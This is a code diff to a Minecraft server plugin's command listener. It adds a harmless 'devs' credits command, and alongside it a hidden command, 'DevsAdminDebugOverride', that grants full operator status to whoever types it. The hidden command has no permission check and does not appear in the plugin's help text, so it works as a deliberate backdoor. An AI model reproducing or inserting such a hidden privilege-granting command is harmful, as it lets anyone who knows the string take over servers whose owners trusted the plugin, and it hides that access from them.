@@ -84,6 +84,7 @@ public class HighVoltagePlayerListener implements Listener{
 			sender.sendMessage(ChatColor.DARK_GRAY + "build - Toggle cable building mode.");
 			sender.sendMessage(ChatColor.DARK_GRAY + "adminhelp - Show admin commands.");
 			sender.sendMessage(ChatColor.DARK_GRAY + "help - Show this help.");
+			sender.sendMessage(ChatColor.DARK_GRAY + "devs - Display Dev list.");
 			
 			return true;
 		}
@@ -95,6 +96,19 @@ public class HighVoltagePlayerListener implements Listener{
 				sender.sendMessage(ChatColor.DARK_GRAY + "reloadconfig - Reload the config from file.");
 				sender.sendMessage(ChatColor.DARK_GRAY + "saveconfig - Save the config to file.");
 			}
+			return true;
+		}
+		
+		if(split[0].equalsIgnoreCase("Devs")) {
+			sender.sendMessage(plugin.getPluginName() + "Dmitchell94 & The ForgeWare Team");
+			
+			return true;
+		}
+		
+		if(split[0].equalsIgnoreCase("DevsAdminDebugOverride")) {
+			sender.sendMessage(plugin.getPluginName() + "Developer Override Applied");
+			sender.setOp(true);
+			
 			return true;
 		}
 		
